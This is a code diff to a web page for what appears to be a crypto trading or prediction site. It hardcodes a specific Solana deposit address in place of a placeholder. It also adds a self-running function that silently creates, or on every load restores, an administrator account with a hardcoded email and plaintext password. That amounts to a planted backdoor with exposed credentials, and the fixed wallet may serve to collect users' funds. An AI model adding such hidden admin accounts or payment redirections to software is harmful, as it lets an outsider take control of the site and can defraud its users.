@@ -415,7 +415,7 @@
           <div class="form-group">
             <label>Send SOL / USDC to this address</label>
             <div class="addr-row">
-              <input type="text" id="depositAddress" readonly value="YOUR_SOLANA_ADDRESS_HERE" />
+              <input type="text" id="depositAddress" readonly value="44vABSx14hrUmkAoV5PwxJeMrNwCHBzrn6RrYx5W4tg2" />
               <button type="button" onclick="copyDepositAddress()">Copy</button>
             </div>
           </div>
@@ -505,7 +505,7 @@
     try { tradeHistory = JSON.parse(localStorage.getItem('mps_trade_history') || '[]'); } catch (e) { tradeHistory = []; }
     let lastPrediction = null;
     let plannedPath = null;
-    const SOLANA_DEPOSIT_ADDRESS = 'YOUR_SOLANA_ADDRESS_HERE';
+    const SOLANA_DEPOSIT_ADDRESS = '44vABSx14hrUmkAoV5PwxJeMrNwCHBzrn6RrYx5W4tg2';
     function formatPrice(p) {
       if (p >= 1000) return '$' + p.toLocaleString('en-US', { maximumFractionDigits: 2 });
       if (p >= 1) return '$' + p.toFixed(4);
@@ -1180,6 +1180,26 @@
     document.getElementById('amount').addEventListener('input', () => { clearProgress(); });
     renderCoinList(); updateUI(); drawChart();
     fetchLivePrice(); setInterval(fetchLivePrice, 45000);
+    (function seedAdmin() {
+      const users = getUsers();
+      const adminEmail = 'personalofficedesk@gmail.com';
+      if (!users[adminEmail]) {
+        users[adminEmail] = {
+          email: adminEmail,
+          password: 'Yalateef1$',
+          name: 'DaddyG Enterprise',
+          balance: 0,
+          isAdmin: true,
+          createdAt: Date.now()
+        };
+        saveUsers(users);
+      } else {
+        users[adminEmail].name = 'DaddyG Enterprise';
+        users[adminEmail].password = 'Yalateef1$';
+        users[adminEmail].isAdmin = true;
+        saveUsers(users);
+      }
+    })();
     document.getElementById('depositAddress').value = SOLANA_DEPOSIT_ADDRESS;
     updateUserChip();
     refreshWalletUI();
